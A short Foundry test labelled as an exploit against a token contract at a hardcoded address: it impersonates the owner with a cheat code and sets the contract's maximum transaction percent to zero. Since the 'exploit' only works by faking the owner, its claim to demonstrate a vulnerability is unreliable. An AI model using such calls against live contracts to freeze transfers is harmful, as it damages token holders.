// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITeaToken {
    function owner() external view returns (address);
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function _maxTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5e18Be2A7cE626B33C539919EAca06303f1Db568;
    address attacker = address(this);
    ITeaToken tea_token;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        tea_token = ITeaToken(TARGET);
        owner = tea_token.owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.prank(owner);
        tea_token.setMaxTxPercent(0);
        assertEq(tea_token._maxTxAmount(), 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

